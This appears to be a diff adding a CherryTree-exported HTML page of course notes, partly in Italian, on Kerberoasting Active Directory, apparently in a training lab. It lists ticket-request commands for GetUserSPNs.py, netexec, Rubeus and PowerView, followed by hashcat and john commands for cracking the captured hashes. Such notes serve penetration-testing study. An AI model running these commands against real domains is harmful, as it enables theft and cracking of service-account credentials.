@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>AD Kerberoasting</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>AD Kerberoasting</h1><br/><p><ol><li><strong><span style="color:#071ba3;">impacket → GetUserSPNs.py</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">$ GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request</span></p><p><ol><li>2) <strong><span style="color:#071ba3;">2</span></strong><span style="color:#071ba3;">) </span><strong><span style="color:#071ba3;">Modulo netexec</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">$ netexec ldap 10.0.2.11 -u &#39;username&#39; -p &#39;password&#39; --kdcHost 10.0.2.11 --kerberoast output.txt</span></p><p><ol><li>3) <strong><span style="color:#071ba3;">3) Rubeus.exe</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">Rubeus.exe kerberoast /stats</span></p><p><ol><li>4) <strong><span style="color:#071ba3;">4) PowerView</span></strong></li></ol></p><p><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;"></span><span style="color:#ff0000;">Request-SPNTicket -SPN &quot;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&quot;</span></p><p></p><p><em>Ognuno di questi tool va bene, nel corso abbiamo usato il primo... Se non dovesse funzionare, abbiamo gli altri a disposizione.</em><em></em></p><p><em></em><em></em></p><p><em>Una volta ottenuto l&#39;hash possiamo crackarlo o con hashcat o con john:</em></p><p></p><p><span style="color:#ff0000;">hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt</span></p><p></p></div>
+</body>
+</html>
